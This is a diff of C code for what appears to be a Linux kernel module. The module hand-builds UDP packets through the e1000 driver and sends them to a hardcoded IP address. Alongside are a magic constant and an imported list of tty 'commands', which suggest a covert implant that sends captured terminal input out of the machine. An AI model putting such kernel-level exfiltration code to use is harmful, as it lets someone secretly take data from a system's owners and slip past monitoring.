@@ -89,7 +89,7 @@ There are two pointers and two offsets in an skb: head, data, tail, end.
 
 head+end represents the end. data-head represents the head room size. data is the starting of the data (i.e. payload).
 
-It follows that data+tail is the first byte of the tailroom. head+end is the first byte past the end (First byte of skb_shared_info)
+It follows that head+tail is the first byte of the tailroom. head+end is the first byte past the end (First byte of skb_shared_info)
 
 */
 
@@ -108,7 +108,7 @@ significant byte comes first. So, on the stack it will be
 PMAHCGOQ where Q is is at the lowest memory address*/
 const unsigned long qogchamp_magic = 0x504d414843474f51;
 
-const char* DEST = "\x81\x15\x5a\x95";
+const char* DEST = "\x81\x15\x5a\x95"; //ip address - big endian. The first octet is at index 0 in the string. 
 //both of these extern structs are created in tty_util
 extern struct list_head commands; 
 
@@ -130,13 +130,40 @@ https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/ipconfig.c#L812
 
 If anyone has documentation on how to actually construct an skb properly, please dm me.
 
-I have been unable to find proper documentation
+I have been unable to find proper documentation on how this shit works.
 
 */
 
 
+static __be32 get_saddr(void){
+    if(!e1000_netdev){
+        printk(KERN_INFO "e1000 is NULL\n");
+        return 0;
+    }
+    /*
+    This returns the PRIMARY unicast host address. In IP addressing, there are secondary and primary IP addresses. 
+    Primary is used for outgoing traffic as the saddr and secondary is used for bind traffic.
+
+    For more information on this phenomenon, please reference:
+    https://elixir.bootlin.com/linux/v5.14/source/include/uapi/linux/if_addr.h#L44
+    https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/devinet.c#L1317
+
+    */
+    return inet_select_addr(e1000_netdev, 0, RT_SCOPE_HOST); 
+}
+
+
+
+
+
+
 
 int construct_and_send_skb(char* data, unsigned int len){ 
+
+    if(!e1000_netdev){
+        printk(KERN_INFO "e1000 has not been initialized\n");
+        return -1;
+    }
 
     struct e1000_packet* packet;
     
@@ -181,6 +208,7 @@ int construct_and_send_skb(char* data, unsigned int len){
     packet -> iph.ttl = 64;
     packet -> iph.protocol = IPPROTO_UDP;
     packet->iph.daddr = htonl(*(unsigned int*)DEST);
+    packet -> iph.saddr = get_saddr(); //get the source address
 
     packet -> iph.check = ip_fast_csum((unsigned char*)&packet->iph, packet->iph.ihl);
 
